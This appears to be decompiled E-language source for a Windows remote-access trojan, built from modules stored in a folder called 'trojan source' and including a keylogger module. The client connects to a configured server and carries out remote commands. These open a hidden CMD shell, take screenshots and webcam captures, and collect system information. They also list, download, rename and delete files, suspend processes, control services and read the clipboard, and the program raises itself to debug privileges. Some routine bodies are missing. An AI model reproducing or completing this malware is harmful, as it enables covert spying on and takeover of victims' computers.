 ' 文件类型：Windows窗口程序

 ' 程序名称：
 ' 程序描述：
 ' 程序作者：
 ' 邮政编码：
 ' 联系地址：
 ' 联系电话：
 ' 传真号码：
 ' 电子信箱：
 ' 主页地址：
 ' 版权声明：
 ' 版本号：1.0
 ' 创建号：0.0

窗口 窗口1
    左边 = 50
    顶边 = 50
    宽度 = 213
    高度 = 209
    鼠标指针 = { 0,0,0,0 }
    标记 = “”
    可视 = 真
    禁止 = 假
    边框 = 2
    底图方式 = 1
    底色 = -16777216 '  0xFF000000
    最大化按钮 = 假
    最小化按钮 = 假
    控制按钮 = 真
    位置 = 1
    可否移动 = 真
    背景音乐播放次数 = 0
    回车下移焦点 = 假
    Esc键关闭 = 真
    F1键打开帮助 = 假
    帮助标志值 = 0
    在任务栏中显示 = 真
    随意移动 = 假
    外形 = 0
    总在最前 = 真
    保持标题栏激活 = 假
    底图 =  ' 空
    图标 =  ' 空
    背景音乐 =  ' 空
    标题 = “临时”
    帮助文件名 = “”





 ' 所需要的支持库：
 ' krnln d09f2340818511d396f6aaf844c7e325 4 4 系统核心支持库
 ' dp1 4BB4003860154917BC7D8230BF4FA58A 1 0 数据操作支持库一



 ' 所需要的模块
 ' API操作 E:\Program Files\木马源码\API操作.ec
 ' 系统服务管理 E:\Program Files\木马源码\系统服务管理.ec
 ' 视频捕获模块 E:\Program Files\木马源码\视频捕捉易模块.ec
 ' 键盘记录_模块 D:\常用的\易语言\键盘记录_模块.ec


数据类型 系统时间_, 公开, 
    .成员 年, 短整数型, , , wYear
    .成员 月, 短整数型, , , wMonth
    .成员 星期, 短整数型, , , wDayOfWeek
    .成员 日, 短整数型, , , wDay
    .成员 小时, 短整数型, , , wHour
    .成员 分, 短整数型, , , wMinute
    .成员 秒, 短整数型, , , wSecond
    .成员 毫秒, 短整数型, , , wMilliseconds

数据类型 矩形_, 公开, 
    .成员 左边, 整数型, , , Left
    .成员 顶边, 整数型, , , Top
    .成员 右边, 整数型, , , Right
    .成员 底边, 整数型, , , Bottom

数据类型 进程列表, 公开, 
    .成员 PID, 整数型, , , 
    .成员 名称, 文本型, , , 
    .成员 路径, 文本型, , , 

数据类型 进程_列表, 公开, 
    .成员 ID, 文本型, , , 进程句柄
    .成员 名称, 文本型, , , 
    .成员 路径, 文本型, , , 全路径

数据类型 服务信息, 公开, 
    .成员 服务名称, 文本型, , , 服务名称
    .成员 显示名称, 文本型, , , 服务管理里显示的名称
    .成员 服务描述, 文本型, , , 管理里显示的描述信息
    .成员 服务类型, 文本型, , , 
    .成员 服务状态, 文本型, , , 服务目前的状态
    .成员 启动方式, 文本型, , , 服务启动方式
    .成员 登陆方式, 文本型, , , 服务启动的方式
    .成员 进程PID, 文本型, , , 服务打开进程的PID

.全局变量 服务器IP, 文本型, , , 
.全局变量 服务器端口, 整数型, , , 
.全局变量 注册码, 文本型, , , 
.全局变量 硬盘特征字, 文本型, , , 
.全局变量 匿名管道是否连接, 逻辑型, , , 

.DLL命令 取现行时间_, 整数型, "kernel32", "GetLocalTime", 公开, 
    .参数 系统时间格式, 系统时间_, 传址, 

.DLL命令 取系统目录_, 整数型, "kernel32", "GetSystemDirectoryA", 公开, 
    .参数 缓冲区, 文本型, , 
    .参数 缓冲区长度, 整数型, , 

.DLL命令 取运行时间_, 整数型, "kernel32", "GetTickCount", 公开, 

.DLL命令 生成声音_, 整数型, "kernel32.dll", "Beep", 公开, 
    .参数 声音频率, 整数型, , dwFreq
    .参数 声音持续时间, 整数型, , dwDuration

.DLL命令 限制指针活动区域_, 整数型, "user32.dll", "ClipCursor", 公开, 
    .参数 矩形区域, 矩形_, 传址, lpRect，指定一个矩形，用像素屏幕坐标系统表示

.DLL命令 文本到数值_, 整数型, "shlwapi.dll", "StrToInt64ExA", 公开, 
    .参数 转换文本, 文本型, , pszString
    .参数 标志, 整数型, , dwFlags
    .参数 返回值, 整数型, 传址, piRet

.DLL命令 取文本地址_, 整数型, "shlwapi.dll", "StrDupA", 公开, 
    .参数 文本, 文本型, , lpSrch

.程序集 程序集1, , , 

.子程序 _启动子程序, 整数型, , 本子程序在程序启动后最先执行
载入 (窗口1, , 真)
返回 (0) ' 可以根据您的需要返回任意数值

.程序集 公共接口, , , 公开接口

.程序集变量 发送次数, 整数型, , , 发送超过三次,就停止发送
.子程序 发送数据, 逻辑型, , 
.参数 文件头, 文本型, , 如 "文件" "视频" 4字节
.参数 数据, 字节集, , 
.参数 保留参数, 文本型, 可空, 保留参数,便于升级和以备不时之需

.局部变量 数据_变量, 字节集, , , 
.局部变量 md5, 文本型, , , 
.局部变量 封包, 字节集, , , 
.局部变量 总长度, 整数型, , , 
.局部变量 现长度, 整数型, , , 
.局部变量 序号, 整数型, , , 
.局部变量 temp, 文本型, , , 
.局部变量 调试, 字节集, , , 



赋值 (数据_变量, 相加 (到字节集 (文件头), 数据, 到字节集 (“over”)))

.如果真 (等于 (窗口1.发送数据 (., 数据_变量), 假))
    赋值 (发送次数, 相加 (发送次数, 1))
    .如果真 (小于或等于 (发送次数, 2))
        .如果真 (发送数据 (文件头, 数据, ))
            返回 (真)
        .如果真结束
        
    .如果真结束
    返回 (假)
.如果真结束
输出调试文本 (取字节集长度 (数据))
返回 (假)



未知函数_2179 () ' *** 缩略程序块 ***
 ' 输出调试文本 (“开始发送截图数据”)
 ' 数据_变量 ＝ 到字节集 (文件头) ＋ 数据 ＋ 到字节集 (保留参数)
 ' 总长度 ＝ 取字节集长度 (数据_变量)
 ' 现长度 ＝ 1
 ' 序号 ＝ 1
 ' 封包 ＝ 取字节集中间 (数据_变量, 现长度, 2000)
 ' md5 ＝ 取数据摘要 (封包)
 ' temp ＝ 取重复文本 (4 － 取文本长度 (到文本 (序号)), “0”) ＋ 到文本 (序号)
 ' .判断循环首 (小于 (现长度, 相减 (总长度, 2000)))
     ' 延时 (100)
     ' .如果真 (等于 (窗口1.发送数据 (., 相加 (到字节集 (md5), 到字节集 (temp), 封包)), 假))
         ' 输出调试文本 (“发送数据失败~~~~~~~~~~~~~~~”)
         ' 到循环尾 ()
    .如果真结束
    
     ' 输出调试文本 (“发送数据成功!”)
    未知函数_494 () ' *** 缩略程序块 ***
     ' 发送数据 :  md5+temp+封包.
     ' 接受顺序是:取数据前32位MD5值和后面所有数据效检.
     ' 然后检查记录33-36这四位.如果不是over.就把序号记下..
     ' 接着检查37-40这四位命令头.根据命令头来判定操作
     ' 40-结束 是数据主体
     ' 由于所有的数据都是压缩后传输.所以必须由md5效验.
     ' 为了防止其中某个包丢失字节.导致解压数据出错
     ' 所以加入了序号.如果某段数据出错.就按照对应的序号要求重发
     ' 现长度 ＝ 现长度 ＋ 2000
     ' 序号 ＝ 序号 ＋ 1
     ' 调试 ＝ 调试 ＋ 封包
    
     ' 封包 ＝ 取字节集中间 (数据_变量, 现长度, 2000)
     ' md5 ＝ 取数据摘要 (封包)
     ' temp ＝ 取重复文本 (4 － 取文本长度 (到文本 (序号)), “0”) ＋ 到文本 (序号)
    
 ' .判断循环尾 ()
 ' 窗口1.客户1.发送数据 (到字节集 (“over”) ＋ 到字节集 (temp) ＋ 封包)
 ' 调试 ＝ 调试 ＋ 封包
 ' ' 窗口1.客户1.发送数据 (“over”)

 ' 窗口1.画板1.底图 ＝ 取字节集右边 (调试, 取字节集长度 (调试) － 4)
 ' 输出调试文本 (取字节集长度 (调试) － 4)
 ' 返回 (真)


.子程序 启动初始化, 空白型, , 必须先运行
.局部变量 参数, 文本型, , , 
.局部变量 temp, 文本型, , "0", 


赋值 (参数, “127.0.0.1 | 5050 | 注册码 | 硬盘特征字”) ' 留着注册接口
赋值 (temp, 分割文本 (参数, “|”, ))
.如果真 (大于或等于 (取数组成员数 (temp), 4))
    赋值 (服务器IP, 删首尾空 (temp [1]))
    赋值 (服务器端口, 到整数 (删首尾空 (temp [2])))
    赋值 (注册码, 删首尾空 (temp [3]))
    赋值 (硬盘特征字, 删首尾空 (temp [4]))
    
     ' -------- 注册码校验用RSA.
    赋值 (硬盘特征字, “Estel无聊涂鸦之做 千万别做非法用途,免的支持库整天被杀”)
    赋值 (注册码, “85301A09F16E01B89CAE1BBEF7001665”)
    
     ' 公匙: 17603
     ' 私匙  5EBA477595CDB6FBEBB5CB47F0373FCB
     ' 公共模数 : D646BDB184348366B558A9AB7396AF69
.如果真结束


.子程序 连接服务器, 逻辑型, , 
.局部变量 指针, 整数型, , , 
.局部变量 线程ID, 整数型, , , 

赋值 (指针, 取文本地址_ (硬盘特征字))
建立线程 (&特征字算法, 指针, 真, 线程ID)

.如果 (窗口1.连接 (., 服务器IP, 服务器端口))
    返回 (真)
.否则
    返回 (假)
.如果结束


.子程序 特征字算法, 空白型, , 
.参数 指针, 整数型, , 

.判断开始 (未知支持库函数_6 (到字节集 (指针到文本 (指针)), 注册码, “17603”, “D646BDB184348366B558A9AB7396AF69”)) ' RSA.
    输出调试文本 (“程序注册成功”)
.默认
    输出调试文本 (“程序注册失败”)
    结束 ()
.判断结束




.窗口程序集 窗口程序集1, , , 

.程序集变量 数据_程序集, 字节集, , , 
.子程序 _按钮1_被单击, 空白型, , 
启动初始化 ()
.如果真 (等于 (连接服务器 (), 假))
    输出调试文本 (“连接失败”)
    返回 ()
.如果真结束


.子程序 _客户1_数据到达, 空白型, , 
.局部变量 temp, 字节集, , , 
.局部变量 命令头, 文本型, , , 

赋值 (temp, 取回数据 ())

.如果真 (等于 (取字节集右边 (temp, 4), 到字节集 (“over”)))
    赋值 (数据_程序集, 相加 (数据_程序集, 取字节集左边 (temp, 相减 (取字节集长度 (temp), 4))))
    赋值 (命令头, 到文本 (取字节集左边 (数据_程序集, 4)))
    .判断开始 (等于 (命令头, “命令”))
        执行命令 (取字节集右边 (数据_程序集, 相减 (取字节集长度 (数据_程序集), 4)))
    .判断 (等于 (命令头, “视频”))
        视频捕获 (取字节集右边 (数据_程序集, 相减 (取字节集长度 (数据_程序集), 4)))
    .判断 (等于 (命令头, “文件”))
        文件管理 (取字节集右边 (数据_程序集, 相减 (取字节集长度 (数据_程序集), 4)))
    .判断 (等于 (命令头, “截图”))
        屏幕截图 (取字节集右边 (数据_程序集, 相减 (取字节集长度 (数据_程序集), 4)))
    .判断 (等于 (命令头, “信息”))
        系统信息 ()
    .判断 (等于 (命令头, “进程”))
        进程管理 (取字节集右边 (数据_程序集, 相减 (取字节集长度 (数据_程序集), 4)))
    .判断 (等于 (命令头, “服务”))
        服务管理 (取字节集右边 (数据_程序集, 相减 (取字节集长度 (数据_程序集), 4)))
    .判断 (等于 (命令头, “视频”))
        视频捕获 (取字节集右边 (数据_程序集, 相减 (取字节集长度 (数据_程序集), 4)))
    .判断 (等于 (命令头, “下载”))
        文件下载 (取字节集右边 (数据_程序集, 相减 (取字节集长度 (数据_程序集), 4)))
    .判断 (等于 (命令头, “剪辑”))
        剪辑版操作 (取字节集右边 (数据_程序集, 相减 (取字节集长度 (数据_程序集), 4)))
    .默认
        
    .判断结束
    
    赋值 (数据_程序集, {  })
    返回 ()
.如果真结束

赋值 (数据_程序集, 相加 (数据_程序集, temp))

.子程序 _窗口1_创建完毕, 空白型, , 
启动初始化 ()
进程_提升进程权限 ()

.子程序 _客户1_连接断开, 空白型, , 
.如果真 (等于 (匿名管道是否连接, 真))
    控制台_断开连接 ()
.如果真结束


.程序集 功能处理, , , 

.程序集变量 取回命令, 文本型, , , 
.程序集变量 视频捕获临时文件, 文本型, , , 
.子程序 执行命令, 空白型, , 
.参数 参数, 字节集, , 

.局部变量 命令, 文本型, , , 

赋值 (命令, 到文本 (参数))
.如果真 (等于 (命令, “断开”))
    赋值 (匿名管道是否连接, 假)
    .如果真 (控制台_断开连接 ())
        输出调试文本 (“断开匿名管道”)
    .如果真结束
    
    返回 ()
.如果真结束

.如果真 (等于 (匿名管道是否连接, 真))
    控制台_发送命令 (命令)
    控制台_取回结果 (&取回命令回调函数)
    返回 ()
.如果真结束


.如果真 (等于 (命令, “连接”))
    赋值 (匿名管道是否连接, 真)
    控制台_连接 ()
    控制台_取回结果 (&取回命令回调函数)
    返回 ()
.如果真结束

发送数据 (“错误”, 到字节集 (“控制台_无法执行操作”), )
 ' 匿名管道

.子程序 系统信息, 空白型, , 
.局部变量 CPU频率, 整数型, , , 
.局部变量 CPU型号, 文本型, , , 
.局部变量 IE版本, 文本型, , , 
.局部变量 windows版本, 文本型, , , 
.局部变量 当前用户, 文本型, , , 
.局部变量 计算机名, 文本型, , , 
.局部变量 系统信息, 类_取系统信息, , , 
.局部变量 发送, 文本型, , , 
.局部变量 分辨率, 文本型, , , 
.局部变量 内存信息, 类_取内存信息, , , 
.局部变量 物理内存信息, 文本型, , , 
.局部变量 虚拟内存信息, 文本型, , , 

赋值 (CPU频率, 系统信息.取CPU频率 ())
赋值 (CPU型号, 系统信息.取CPU信息 ())
赋值 (IE版本, 系统信息.取IE版本 ())
赋值 (windows版本, 系统信息.取Windows版本 ())
赋值 (当前用户, 系统信息.取当前用户 ())
赋值 (计算机名, 系统信息.取计算机名 ())
赋值 (分辨率, 相加 (到文本 (取屏幕宽度 ()), “*”, 到文本 (取屏幕高度 ())))

赋值 (物理内存信息, 相加 (到文本 (到整数 (相除 (内存信息.取可用物理内存 (), 1024, 1024))), “MB/”, 到文本 (到整数 (相除 (内存信息.取物理内存容量 (), 1024, 1024))), “MB”))

赋值 (虚拟内存信息, 相加 (到文本 (到整数 (相除 (内存信息.取可用虚拟内存 (), 1024, 1024))), “MB/”, 到文本 (到整数 (相除 (内存信息.取虚拟内存容量 (), 1024, 1024))), “MB”))
赋值 (发送, 相加 (CPU型号, “|”, 到文本 (CPU频率), “|”, 物理内存信息, “|”, 虚拟内存信息, “|”, windows版本, “|”, IE版本, “|”, 当前用户, “|”, 计算机名, “|”, 分辨率))
发送数据 (“信息”, 到字节集 (发送))
 ' 取系统信息

.子程序 屏幕截图, 空白型, , 
.参数 参数, 字节集, , 

.局部变量 temp, 文本型, , , 
.局部变量 临时数据, 字节集, , , 
.局部变量 是否持续, 逻辑型, , , 

.如果真 (等于 (到文本 (参数), “”))
    屏幕截图发送 ()
    返回 ()
.如果真结束

.如果真 (等于 (到文本 (参数), “ok”))
    屏幕截图发送 ()
    返回 ()
.如果真结束

 ' 屏幕截图


.子程序 屏幕截图发送, 空白型, , 

发送数据 (“截图”, 未知支持库函数_0 (快照 ()), )



.子程序 文件管理, 空白型, , 
.参数 参数, 字节集, , 

.局部变量 命令, 文本型, , , 
.局部变量 文件名, 文本型, , , 
.局部变量 列表, 文本型, , , 

赋值 (命令, 到文本 (参数))
.如果真 (等于 (命令, “disk”))
    发送数据 (“文件disk|”, 到字节集 (取所有盘符 ()), )
    返回 ()
.如果真结束


.如果真 (不等于 (取文本右边 (命令, 1), “\”))
    赋值 (命令, 相加 (命令, “\”))
.如果真结束

赋值 (文件名, 寻找文件 (相加 (命令, “*.*”), #子目录))
.判断循环首 (不等于 (文件名, “”))
    赋值 (列表, 相加 (列表, 文件名, “\|”))
    赋值 (文件名, 寻找文件 (#子目录))
.判断循环尾 ()

赋值 (文件名, 寻找文件 (相加 (命令, “\*.*”), ))
.判断循环首 (不等于 (文件名, “”))
    赋值 (列表, 相加 (列表, 文件名, “|”))
    赋值 (文件名, 寻找文件 ())
.判断循环尾 ()

发送数据 (“文件”, 到字节集 (列表), )

.子程序 取回命令回调函数, 空白型, , 
.参数 指针, 整数型, , 

赋值 (取回命令, 相加 (取回命令, 指针到文本 (指针)))

.如果真 (等于 (取文本右边 (取回命令, 1), “>”))
    发送数据 (“命令”, 到字节集 (取回命令), )
    赋值 (取回命令, “”)
.如果真结束


.子程序 进程管理, 空白型, , 
.参数 参数, 字节集, , 

.局部变量 命令, 文本型, , "0", 
.局部变量 进程列表, 进程列表, , "0", 
.局部变量 i, 整数型, , , 
.局部变量 temp, 文本型, , , 

赋值 (命令, 分割文本 (到文本 (参数), “|”, ))
.判断开始 (等于 (命令 [1], “list”))
    .如果真 (等于 (进程_取进程列表 (进程列表), 假))
        发送数据 (“错误”, 到字节集 (“进程_取进程列表失败!”))
        返回 ()
    .如果真结束
    .计次循环首 (取数组成员数 (进程列表), i)
        赋值 (temp, 相加 (temp, 进程列表 [i], 名称, “,”, 到文本 (进程列表 [i], PID), “,”, 进程列表 [i], 路径, “|”))
    .计次循环尾 ()
    发送数据 (“进程”, 到字节集 (temp), )
    
    
    
.判断 (等于 (命令 [1], “stop”))
    进程_挂起进程 (到整数 (命令 [2]))
.判断 (等于 (命令 [1], “stat”))
    进程_恢复进程 (到整数 (命令 [2]))
.判断 (等于 (命令 [1], “kill”))
    
.默认
    
.判断结束





.子程序 服务管理, 空白型, , 
.参数 参数, 字节集, , 

.局部变量 命令, 文本型, , , 
.局部变量 服务列表, 服务信息, , "0", 
.局部变量 是否驱动, 逻辑型, , , 
.局部变量 i, 整数型, , , 
.局部变量 数据, 文本型, , , 

赋值 (命令, 到文本 (参数))
.如果 (等于 (取文本右边 (命令, 1), 到文本 (1)))
    赋值 (是否驱动, 真)
.否则
    赋值 (是否驱动, 假)
.如果结束


.判断开始 (等于 (取文本左边 (命令, 4), “list”))
    E_取服务列表 (是否驱动, 服务列表)
    输出调试文本 (是否驱动)
    .计次循环首 (取数组成员数 (服务列表), i)
        赋值 (数据, 相加 (数据, 服务列表 [i], 服务名称, “,”))
        赋值 (数据, 相加 (数据, 服务列表 [i], 显示名称, “,”))
        赋值 (数据, 相加 (数据, 服务列表 [i], 服务描述, “,”))
        赋值 (数据, 相加 (数据, 服务列表 [i], 服务类型, “,”))
        赋值 (数据, 相加 (数据, 服务列表 [i], 服务状态, “,”))
        赋值 (数据, 相加 (数据, 服务列表 [i], 启动方式, “,”))
        赋值 (数据, 相加 (数据, 服务列表 [i], 登陆方式, “,”))
        赋值 (数据, 相加 (数据, 服务列表 [i], 进程PID, “|”))
    .计次循环尾 ()
    发送数据 (“服务”, 到字节集 (数据), )
    赋值 (数据, “”)
    清除数组 (服务列表)
    返回 ()
.判断 (等于 (取文本左边 (命令, 4), “exit”))
    
    E_停止服务 (取文本右边 (命令, 相减 (取文本长度 (命令), 4)))
    返回 ()
.判断 (等于 (取文本左边 (命令, 4), “stop”))
    E_暂停服务 (取文本右边 (命令, 相减 (取文本长度 (命令), 4)))
    返回 ()
.判断 (等于 (取文本左边 (命令, 4), “reun”))
    E_继续服务 (取文本右边 (命令, 相减 (取文本长度 (命令), 4)))
    返回 ()
.判断 (等于 (取文本左边 (命令, 4), “erun”))
    E_运行服务 (取文本右边 (命令, 相减 (取文本长度 (命令), 4)))
.默认
    
.判断结束


.子程序 视频捕获, 空白型, , 
.参数 参数, 字节集, , 

.局部变量 命令, 文本型, , , 

赋值 (命令, 到文本 (参数))
.如果真 (等于 (命令, “stat”))
    创建视频窗口 (窗口1.取窗口句柄 (.), 300, 300)
    处理事件 ()
    开始捕获 (600)
    .计次循环首 (500, )
        处理事件 ()
    .计次循环尾 ()
    
    赋值 (视频捕获临时文件, 取临时文件名 ())
    视频捕获发送 ()
    返回 ()
.如果真结束
.如果真 (等于 (命令, “ok”))
    视频捕获发送 ()
    返回 ()
.如果真结束
.如果真 (等于 (命令, “exit”))
    停止捕获 ()
    返回 ()
.如果真结束


.子程序 视频捕获发送, 空白型, , 
.局部变量 temp, 字节集, , , 

.如果真 (不等于 (视频抓图 (视频捕获临时文件), 0))
    处理事件 ()
    赋值 (temp, 读入文件 (视频捕获临时文件))
    发送数据 (“视频”, 未知支持库函数_0 (temp), )
    赋值 (temp, {  })
.如果真结束


.子程序 文件下载, 空白型, , 
.参数 参数, 字节集, , 

.局部变量 文件路径, 文本型, , , 
.局部变量 命令, 文本型, , , 
.局部变量 文本数组, 文本型, , "0", 

赋值 (命令, 到文本 (取字节集左边 (参数, 4)))
赋值 (文件路径, 到文本 (取字节集右边 (参数, 相减 (取字节集长度 (参数), 4))))
.判断开始 (等于 (命令, “下载”))
    发送数据 (“下载”, 未知支持库函数_0 (读入文件 (文件路径)), )
.判断 (等于 (命令, “重命”))
    赋值 (文本数组, 分割文本 (文件路径, “|”, ))
    .如果真 (大于或等于 (取数组成员数 (文本数组), 2))
        文件更名 (文本数组 [1], 文本数组 [2])
    .如果真结束
    
.判断 (等于 (命令, “删除”))
    删除文件 (文件路径)
.默认
    
.判断结束


.子程序 剪辑版操作, 空白型, , 
.参数 参数, 字节集, , 

.局部变量 命令头, 文本型, , , 

赋值 (命令头, 到文本 (取字节集左边 (参数, 6)))
.判断开始 (等于 (命令头, “取文本”))
    发送数据 (“剪辑”, 到字节集 (相加 (“文本”, 取剪辑板文本 ())), )
.判断 (等于 (命令头, “置文本”))
    置剪辑板文本 (到文本 (取字节集右边 (参数, 相减 (取字节集长度 (参数), 10))))
.默认
    
.判断结束


.类模块 类_取系统信息, , , 

.子程序 取当前用户, 文本型, , 


.子程序 取运行时间, 整数型, , 


.子程序 取win目录, 文本型, , 返回windows目录


.子程序 限制鼠标活动区域, 空白型, , 
.参数 上, 整数型, , 
.参数 下, 整数型, , 
.参数 左, 整数型, , 
.参数 右, 整数型, , 



.子程序 取计算机名, 文本型, , 


.子程序 取临时文件名, 文本型, , 返回创建一个空的临时文件,不会重复
.参数 目录, 文本型, 可空, 
.参数 前缀, 文本型, 可空, 



.子程序 取Windows版本, 文本型, , 


.子程序 取IE版本, 文本型, , 


.子程序 取CPU信息, 文本型, , 此方法不能使用于斩月,调用了核心支持库命令


.子程序 取CPU频率, 整数型, , 此方法不能使用于斩月,调用了核心支持库命令


.类模块 类_取内存信息, , , 

.子程序 取物理内存容量, 整数型, , 返回物理内容容量 字节


.子程序 取可用物理内存, 整数型, , 返回可用物理内存容量 字节


.子程序 取总页面容量, 整数型, , 返回总页面容量,虚拟+物理 字节


.子程序 取虚拟内存容量, 整数型, , 返回物理内容容量 字节


.子程序 取可用虚拟内存, 整数型, , 返回可用物理内存容量 字节


.子程序 取可用页容量, 整数型, , 


.子程序 取百分比, 整数型, , 返回内存占用率%


.程序集 __HIDDEN_TEMP_MOD__, , , 

.子程序 建立线程, 整数型, , 
.参数 子程序指针, 子程序指针, , 提供欲执行的子程序的指针
.参数 子程序参数, 整数型, , 可提供欲执行的子程序的第一个参数，仅支持整数型
.参数 是否立即执行, 逻辑型, , 若此值为假，则建立的线程将被挂起，反之则立即执行
.参数 线程ID, 整数型, 参考 可空, 内核给新生成的线程分配的线程ID。提供参数时只能提供容器



.子程序 运行线程, 空白型, , 运行由＜建立线程＞建立的当前处于挂起状态的线程
.参数 线程句柄, 整数型, , 由＜建立线程＞返回的线程句柄



.子程序 中止线程, 空白型, , 强行中止线程
.参数 线程句柄, 整数型, , 由＜建立线程＞返回的线程句柄



.子程序 字节数组到文本_, 文本型, , 
.参数 参数, 字节型, 数组, 



.子程序 文本到整数_, 空白型, , 
.参数 参数, 文本型, , 
.参数 返回值, 整数型, 参考, 



.子程序 浏览文件夹_, 文本型, , API浏览文件夹
.参数 初始目录, 文本型, 可空, 初始目录
.参数 标题, 文本型, 可空, 设置标题
.参数 显示文件, 逻辑型, 可空, 默认为假。
.参数 地址栏, 逻辑型, 可空, 是否包含编辑框，默认为真
.参数 新样式, 逻辑型, 可空, 有新建按钮及右键菜单，默认为真



.子程序 时钟_设置, 整数型, , 创建,调整 返回时钟句柄,0表示失败
.参数 窗口句柄, 整数型, 可空, 
.参数 事件标识符, 整数型, , 
.参数 时钟周期, 整数型, , 
.参数 回调函数, 子程序指针, , 



.子程序 时钟_销毁, 整数型, , 返回0表示失败.1表示成功
.参数 窗口句柄, 整数型, 可空, 
.参数 时钟句柄, 整数型, , 时钟句柄为创建时得返回值



.子程序 拖放对象_注册, 空白型, , 请勿二次注册.否则会出错!
.参数 句柄, 整数型, , 需要注册得组件句柄,可为窗口句柄
.参数 回调子程序指针, 子程序指针, , 接收到拖放后,会投递文件名的指针给该回调函数.所以该回调函数必须有一个整型参数.



.子程序 模块_写到文件, 整数型, , 
.参数 文件名, 文本型, , 
.参数 数据, 字节集, , 
.参数 长度, 整数型, , 要写入的字节集长度



.子程序 进程_取进程列表, 逻辑型, , 
.参数 进程列表, 进程列表, 参考 数组, 



.子程序 进程_提升进程权限, 逻辑型, , 提升进程权限到调试级
.参数 目标进程, 整数型, 可空, 
.参数 权限类别, 文本型, 可空, 



.子程序 进程_挂起进程, 逻辑型, , 
.参数 PID, 整数型, , 



.子程序 进程_恢复进程, 逻辑型, , 
.参数 PID, 整数型, , 



.子程序 _取系统目录, 文本型, , 返回system32


.子程序 控制台_连接, 整数型, , 连接到创建的一个隐式CMD进程,以实现对控制台的标准输入与输出操作.返回CMD进程的进程ID,0意味着失败,非0表示成功.
.参数 CMD名称, 文本型, 可空, 默认名称是CMD.EXE,如果被改名,请在这里改为相应名称,备注:要创建一个CMD进程,程序必须要知道它的名称.
.参数 运行目录, 文本型, 可空, 创建CMD进程时的默认目录,这里默认在系统目录,如果要指定其它目录,请在目录名后加上"\"



.子程序 控制台_取回结果, 空白型, , 取回已连接控制台的命令提示(控制台标准输出与标准错误输出,也就是"回显"),成功返回真,失败返回假..
.参数 回调函数, 子程序指针, , 



.子程序 控制台_发送命令, 整数型, , 向已经连接的控制台发送命令(标准输入),返回输入命令的实际长度,返回0意味着失败,非0表示成功.
.参数 命令名, 文本型, , 可以是任何控制台命令,注意:已经对exit命令做了处理,输入命令"exit"可以达到断开连接的目地.



.子程序 控制台_断开连接, 逻辑型, , 断开一个已经连接的控制台,成功返回真,失败返回假.注意:在标准输入里输入命令"exit"也可以达到断开连接的目地.


.子程序 取所有盘符, 文本型, , 返回硬盘所有的盘符,用"|"分隔


.程序集 __HIDDEN_TEMP_MOD__, , , 

.子程序 E_取服务列表, 空白型, , 
.参数 服务类型, 逻辑型, 可空, 可空,默认为真.既取程序服务.为假的话,是取驱动级服务
.参数 服务列表, 服务信息, 参考 数组, 传递一个变量.用于储存服务信息



.子程序 E_运行服务, 逻辑型, , 请自行判断服务是否已经运行
.参数 服务名称, 文本型, , 



.子程序 E_停止服务, 逻辑型, , 
.参数 服务名称, 文本型, , 



.子程序 E_暂停服务, 逻辑型, , 
.参数 服务名称, 文本型, , 



.子程序 E_继续服务, 逻辑型, , 
.参数 服务名称, 文本型, , 



.程序集 __HIDDEN_TEMP_MOD__, , , 

.子程序 创建视频窗口, 整数型, , 返回句柄
.参数 窗口句柄, 整数型, , 
.参数 宽度, 整数型, , 
.参数 高度, 整数型, , 



.子程序 开始捕获, 整数型, , 成功返回非0
.参数 帧数, 整数型, 可空, 



.子程序 停止捕获, 整数型, , 成功返回非0


.子程序 视频抓图, 整数型, , 成功返回非0
.参数 文件名, 文本型, , 



.子程序 视频设置, 整数型, , 成功返回非0


.子程序 视频录像, 整数型, , 保存视频录像到C:\
.参数 文件名, 文本型, 可空, 保存路径,有问题,只能为空.抽空再改



.程序集 __HIDDEN_TEMP_MOD__, , , 

.子程序 获得按键, 文本型, , 



 ' 不属于任何一个程序集、类模块的函数：
